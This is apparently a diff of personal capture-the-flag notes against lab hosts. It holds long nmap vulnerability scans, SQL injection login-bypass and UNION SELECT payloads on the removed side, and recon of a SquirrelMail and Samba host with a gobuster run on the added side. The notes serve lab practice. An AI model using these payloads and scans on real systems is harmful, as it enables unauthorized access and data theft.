@@ -1,41 +1,11 @@
-┌─[✗]─[user@parrot]─[~]
-└──╼ $ip addr
-1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-    inet6 ::1/128 scope host noprefixroute 
-       valid_lft forever preferred_lft forever
-2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
-    link/ether 08:00:27:8e:1e:6b brd ff:ff:ff:ff:ff:ff
-    inet 192.168.1.168/24 brd 192.168.1.255 scope global dynamic noprefixroute enp0s3
-       valid_lft 84104sec preferred_lft 84104sec
-    inet6 2600:4040:3085:e600:162:3697:3b4c:fd33/64 scope global dynamic noprefixroute 
-       valid_lft 7098sec preferred_lft 7098sec
-    inet6 fe80::bce6:d364:a843:7b3a/64 scope link noprefixroute 
-       valid_lft forever preferred_lft forever
-3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
-    link/ether 08:00:27:12:d5:7a brd ff:ff:ff:ff:ff:ff
-    inet 10.0.3.16/24 brd 10.0.3.255 scope global noprefixroute enp0s8
-       valid_lft forever preferred_lft forever
-    inet6 fe80::237d:5096:a531:ccdc/64 scope link noprefixroute 
-       valid_lft forever preferred_lft forever
-4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
-    link/none 
-    inet 10.23.80.154/16 scope global tun0
-       valid_lft forever preferred_lft forever
-    inet6 fe80::91c0:cb88:3809:b40b/64 scope link stable-privacy proto kernel_ll 
-       valid_lft forever preferred_lft forever
-
-
-┌─[✗]─[user@parrot]─[~/Desktop]
-└──╼ $sudo nmap -A -T4 --script vuln -p- -oN initial.nmap 10.10.231.54
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-16 00:57 UTC
-Nmap scan report for 10.10.231.54
-Host is up (0.098s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+┌─[user@parrot]─[~]
+└──╼ $nmap -A -T4 --script vuln -p- -oN initial.nmap 10.10.223.65
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 21:22 UTC
+Nmap scan report for 10.10.223.65
+Host is up (0.097s latency).
+Not shown: 65529 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | vulners: 
 |   cpe:/a:openbsd:openssh:7.2p2: 
 |     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	10.0	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	*EXPLOIT*
@@ -45,13 +15,12 @@ PORT   STATE SERVICE VERSION
 |     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
 |     	5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	9.8	https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	*EXPLOIT*
 |     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
-|     	95499236-C9FE-56A6-9D7D-E943A24B633A	8.7	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLOIT*
 |     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
 |     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
 |     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
 |     	CVE-2016-10012	7.8	https://vulners.com/cve/CVE-2016-10012
 |     	CVE-2015-8325	7.8	https://vulners.com/cve/CVE-2015-8325
-|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
+|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494*EXPLOIT*
 |     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
 |     	PACKETSTORM:173661	7.5	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
 |     	F0979183-AE88-53B4-86CF-3AF0523F3807	7.5	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
@@ -59,13 +28,14 @@ PORT   STATE SERVICE VERSION
 |     	CVE-2016-8858	7.5	https://vulners.com/cve/CVE-2016-8858
 |     	CVE-2016-6515	7.5	https://vulners.com/cve/CVE-2016-6515
 |     	CVE-2016-10708	7.5	https://vulners.com/cve/CVE-2016-10708
-|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
+|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576*EXPLOIT*
 |     	CVE-2016-10009	7.3	https://vulners.com/cve/CVE-2016-10009
 |     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
 |     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
 |     	CVE-2016-10010	7.0	https://vulners.com/cve/CVE-2016-10010
 |     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
-|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
+|     	95499236-C9FE-56A6-9D7D-E943A24B633A	6.9	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLOIT*
+|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577*EXPLOIT*
 |     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
 |     	F79E574D-30C8-5C52-A801-66FFA0610BAA	6.8	https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA	*EXPLOIT*
 |     	EDB-ID:46516	6.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
@@ -74,7 +44,7 @@ PORT   STATE SERVICE VERSION
 |     	CVE-2019-6110	6.8	https://vulners.com/cve/CVE-2019-6110
 |     	CVE-2019-6109	6.8	https://vulners.com/cve/CVE-2019-6109
 |     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	6.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
-|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918	*EXPLOIT*
+|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918*EXPLOIT*
 |     	10213DBE-F683-58BB-B6D3-353173626207	6.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
 |     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
 |     	EDB-ID:40858	6.4	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
@@ -92,8 +62,8 @@ PORT   STATE SERVICE VERSION
 |     	54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	5.9	https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	*EXPLOIT*
 |     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
 |     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
-|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
-|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
+|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328*EXPLOIT*
+|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009*EXPLOIT*
 |     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
 |     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
 |     	PACKETSTORM:136251	5.5	https://vulners.com/packetstorm/PACKETSTORM:136251	*EXPLOIT*
@@ -102,7 +72,7 @@ PORT   STATE SERVICE VERSION
 |     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
 |     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
 |     	CVE-2016-10011	5.5	https://vulners.com/cve/CVE-2016-10011
-|     	1337DAY-ID-25388	5.5	https://vulners.com/zdt/1337DAY-ID-25388	*EXPLOIT*
+|     	1337DAY-ID-25388	5.5	https://vulners.com/zdt/1337DAY-ID-25388*EXPLOIT*
 |     	EDB-ID:45939	5.3	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
 |     	EDB-ID:45233	5.3	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
 |     	CVE-2018-20685	5.3	https://vulners.com/cve/CVE-2018-20685
@@ -114,52 +84,48 @@ PORT   STATE SERVICE VERSION
 |     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
 |     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
 |     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
-|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
+|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730*EXPLOIT*
 |     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
 |     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
-|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
-|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
+|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440*EXPLOIT*
+|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438*EXPLOIT*
 |     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
 |     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
 |     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
 |     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
 |     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
 |     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
-|     	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
-|     	1337DAY-ID-26468	0.0	https://vulners.com/zdt/1337DAY-ID-26468	*EXPLOIT*
-|_    	1337DAY-ID-25391	0.0	https://vulners.com/zdt/1337DAY-ID-25391	*EXPLOIT*
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
-|_http-dombased-xss: Couldn't find any DOM based XSS.
+|     	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937*EXPLOIT*
+|     	1337DAY-ID-26468	0.0	https://vulners.com/zdt/1337DAY-ID-26468*EXPLOIT*
+|_    	1337DAY-ID-25391	0.0	https://vulners.com/zdt/1337DAY-ID-25391*EXPLOIT*
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
 | http-csrf: 
-| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.231.54
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.223.65
 |   Found the following possible CSRF vulnerabilities: 
 |     
-|     Path: http://10.10.231.54:80/
-|     Form id: field_username
-|     Form action: index.php
-|     
-|     Path: http://10.10.231.54:80/
-|     Form id: 
-|     Form action: #
-|     
-|     Path: http://10.10.231.54:80/index.php
-|     Form id: field_username
-|     Form action: index.php
-|     
-|     Path: http://10.10.231.54:80/index.php
+|     Path: http://10.10.223.65:80/
 |     Form id: 
 |_    Form action: #
-| http-internal-ip-disclosure: 
-|_  Internal IP Leaked: 127.0.1.1
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
 |_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
 | http-enum: 
-|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
+|_  /squirrelmail/images/sm_logo.png: SquirrelMail
 | vulners: 
 |   cpe:/a:apache:http_server:2.4.18: 
 |     	C94CBDE1-4CC5-5C06-9D18-23CAB216705E	10.0	https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E	*EXPLOIT*
@@ -233,9 +199,9 @@ PORT   STATE SERVICE VERSION
 |     	22DCCD26-B68C-5905-BAC2-71D10DE3F123	9.8	https://vulners.com/githubexploit/22DCCD26-B68C-5905-BAC2-71D10DE3F123	*EXPLOIT*
 |     	2108729F-1E99-54EF-9A4B-47299FD89FF2	9.8	https://vulners.com/githubexploit/2108729F-1E99-54EF-9A4B-47299FD89FF2	*EXPLOIT*
 |     	1C39E10A-4A38-5228-8334-2A5F8AAB7FC3	9.8	https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3	*EXPLOIT*
-|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214	*EXPLOIT*
-|     	1337DAY-ID-37777	9.8	https://vulners.com/zdt/1337DAY-ID-37777	*EXPLOIT*
-|     	1337DAY-ID-36952	9.8	https://vulners.com/zdt/1337DAY-ID-36952	*EXPLOIT*
+|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214*EXPLOIT*
+|     	1337DAY-ID-37777	9.8	https://vulners.com/zdt/1337DAY-ID-37777*EXPLOIT*
+|     	1337DAY-ID-36952	9.8	https://vulners.com/zdt/1337DAY-ID-36952*EXPLOIT*
 |     	11813536-2AFF-5EA4-B09F-E9EB340DDD26	9.8	https://vulners.com/githubexploit/11813536-2AFF-5EA4-B09F-E9EB340DDD26	*EXPLOIT*
 |     	0C47BCF2-EA6F-5613-A6E8-B707D64155DE	9.8	https://vulners.com/githubexploit/0C47BCF2-EA6F-5613-A6E8-B707D64155DE	*EXPLOIT*
 |     	0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56	9.8	https://vulners.com/githubexploit/0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56	*EXPLOIT*
@@ -261,7 +227,6 @@ PORT   STATE SERVICE VERSION
 |     	4373C92A-2755-5538-9C91-0469C995AA9B	9.0	https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B	*EXPLOIT*
 |     	36618CA8-9316-59CA-B748-82F15F407C4F	9.0	https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F	*EXPLOIT*
 |     	3F71F065-66D4-541F-A813-9F1A2F2B1D91	8.8	https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91	*EXPLOIT*
-|     	95499236-C9FE-56A6-9D7D-E943A24B633A	8.7	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLOIT*
 |     	CVE-2021-44224	8.2	https://vulners.com/cve/CVE-2021-44224
 |     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	*EXPLOIT*
 |     	CVE-2024-38473	8.1	https://vulners.com/cve/CVE-2024-38473
@@ -399,10 +364,10 @@ PORT   STATE SERVICE VERSION
 |     	1B75F2E2-5B30-58FA-98A4-501B91327D7F	7.5	https://vulners.com/githubexploit/1B75F2E2-5B30-58FA-98A4-501B91327D7F	*EXPLOIT*
 |     	18AE455A-1AA7-5386-81C2-39DA02CEFB57	7.5	https://vulners.com/githubexploit/18AE455A-1AA7-5386-81C2-39DA02CEFB57	*EXPLOIT*
 |     	17C6AD2A-8469-56C8-BBBE-1764D0DF1680	7.5	https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680	*EXPLOIT*
-|     	1337DAY-ID-38427	7.5	https://vulners.com/zdt/1337DAY-ID-38427	*EXPLOIT*
-|     	1337DAY-ID-37030	7.5	https://vulners.com/zdt/1337DAY-ID-37030	*EXPLOIT*
-|     	1337DAY-ID-36937	7.5	https://vulners.com/zdt/1337DAY-ID-36937	*EXPLOIT*
-|     	1337DAY-ID-36897	7.5	https://vulners.com/zdt/1337DAY-ID-36897	*EXPLOIT*
+|     	1337DAY-ID-38427	7.5	https://vulners.com/zdt/1337DAY-ID-38427*EXPLOIT*
+|     	1337DAY-ID-37030	7.5	https://vulners.com/zdt/1337DAY-ID-37030*EXPLOIT*
+|     	1337DAY-ID-36937	7.5	https://vulners.com/zdt/1337DAY-ID-36937*EXPLOIT*
+|     	1337DAY-ID-36897	7.5	https://vulners.com/zdt/1337DAY-ID-36897*EXPLOIT*
 |     	1145F3D1-0ECB-55AA-B25D-A26892116505	7.5	https://vulners.com/githubexploit/1145F3D1-0ECB-55AA-B25D-A26892116505	*EXPLOIT*
 |     	108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2	7.5	https://vulners.com/githubexploit/108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2	*EXPLOIT*
 |     	0C28A0EC-7162-5D73-BEC9-B034F5392847	7.5	https://vulners.com/githubexploit/0C28A0EC-7162-5D73-BEC9-B034F5392847	*EXPLOIT*
@@ -413,7 +378,8 @@ PORT   STATE SERVICE VERSION
 |     	CVE-2020-35452	7.3	https://vulners.com/cve/CVE-2020-35452
 |     	CNVD-2024-36395	7.3	https://vulners.com/cnvd/CNVD-2024-36395
 |     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
-|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
+|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502*EXPLOIT*
+|     	95499236-C9FE-56A6-9D7D-E943A24B633A	6.9	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLOIT*
 |     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
 |     	4427DEE4-E1E2-5A16-8683-D74750941604	6.8	https://vulners.com/githubexploit/4427DEE4-E1E2-5A16-8683-D74750941604	*EXPLOIT*
 |     	0095E929-7573-5E4A-A7FA-F6598A35E8DE	6.8	https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE	*EXPLOIT*
@@ -429,7 +395,7 @@ PORT   STATE SERVICE VERSION
 |     	CVE-2018-11763	5.9	https://vulners.com/cve/CVE-2018-11763
 |     	CVE-2016-1546	5.9	https://vulners.com/cve/CVE-2016-1546
 |     	45F0EB7B-CE04-5103-9D40-7379AE4B6CDD	5.8	https://vulners.com/githubexploit/45F0EB7B-CE04-5103-9D40-7379AE4B6CDD	*EXPLOIT*
-|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
+|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577*EXPLOIT*
 |     	CVE-2020-13938	5.5	https://vulners.com/cve/CVE-2020-13938
 |     	CVE-2022-37436	5.3	https://vulners.com/cve/CVE-2022-37436
 |     	CVE-2022-28614	5.3	https://vulners.com/cve/CVE-2022-28614
@@ -449,8 +415,8 @@ PORT   STATE SERVICE VERSION
 |     	EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	*EXPLOIT*
 |     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
 |     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
-|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
-|     	1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574	*EXPLOIT*
+|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573*EXPLOIT*
+|     	1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574*EXPLOIT*
 |     	FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197	4.3	https://vulners.com/githubexploit/FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197	*EXPLOIT*
 |     	F893E602-F8EB-5D23-8ABF-920890DB23A3	4.3	https://vulners.com/githubexploit/F893E602-F8EB-5D23-8ABF-920890DB23A3	*EXPLOIT*
 |     	F463914D-1B20-54CA-BF87-EA28F3ADE2A3	4.3	https://vulners.com/githubexploit/F463914D-1B20-54CA-BF87-EA28F3ADE2A3	*EXPLOIT*
@@ -485,200 +451,74 @@ PORT   STATE SERVICE VERSION
 |     	27108E72-8DC1-53B5-97D9-E869CA13EFF7	4.3	https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7	*EXPLOIT*
 |     	24ADD37D-C8A1-5671-A0F4-378760FC69AC	4.3	https://vulners.com/githubexploit/24ADD37D-C8A1-5671-A0F4-378760FC69AC	*EXPLOIT*
 |     	1E6E9010-4BDF-5C30-951C-79C280B90883	4.3	https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883	*EXPLOIT*
-|     	1337DAY-ID-36854	4.3	https://vulners.com/zdt/1337DAY-ID-36854	*EXPLOIT*
-|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
+|     	1337DAY-ID-36854	4.3	https://vulners.com/zdt/1337DAY-ID-36854*EXPLOIT*
+|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575*EXPLOIT*
 |     	04E3583E-DFED-5D0D-BCF2-1C1230EB666D	4.3	https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D	*EXPLOIT*
 |     	PACKETSTORM:164501	0.0	https://vulners.com/packetstorm/PACKETSTORM:164501	*EXPLOIT*
 |     	PACKETSTORM:164418	0.0	https://vulners.com/packetstorm/PACKETSTORM:164418	*EXPLOIT*
 |     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
 |     	PACKETSTORM:140265	0.0	https://vulners.com/packetstorm/PACKETSTORM:140265	*EXPLOIT*
-|     	1337DAY-ID-26497	0.0	https://vulners.com/zdt/1337DAY-ID-26497	*EXPLOIT*
+|     	1337DAY-ID-26497	0.0	https://vulners.com/zdt/1337DAY-ID-26497*EXPLOIT*
 |_    	05403438-4985-5E78-A702-784E03F724D4	0.0	https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4	*EXPLOIT*
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.94SVN%E=4%D=4/16%OT=22%CT=1%CU=31224%PV=Y%DS=2%DC=T%G=Y%TM=67FF
-OS:0303%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%TS=8)SEQ(S
-OS:P=104%GCD=1%ISR=10A%TI=Z%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II
-OS:=I%TS=8)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M509ST11NW7
-OS:%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST1
-OS:1)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%
-OS:W=6903%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
-OS:N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=
-OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
-OS:7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN
-OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_smb-vuln-ms10-054: false
+| smb-vuln-regsvc-dos: 
+|   VULNERABLE:
+|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
+|     State: VULNERABLE
+|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
+|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
+|       while working on smb-enum-sessions.
+|_          
+|_smb-vuln-ms10-061: false
 
-TRACEROUTE (using port 8080/tcp)
-HOP RTT       ADDRESS
-1   102.63 ms 10.23.0.1
-2   102.70 ms 10.10.231.54
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1096.13 seconds
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 623.78 seconds
+#interesting:
+| http-enum: 
+|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
+|_  /squirrelmail/images/sm_logo.png: SquirrelMail
 
-entering ' or 1=1;-- into user field and password blank bypassed login by ending SQL query and providing a true statement
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 
-in the game query DB at page 10.10.231.54/portal.php searching
+should try SMB enum and check squirrel mail directories including login.php
 
-Title Review 2 3 
-output for
-' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- let'
+─[user@parrot]─[~]
+└──╼ $gobuster dir -u 10.10.223.65 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.223.65
+[+] Method:                  GET
+[+] Threads:                 10
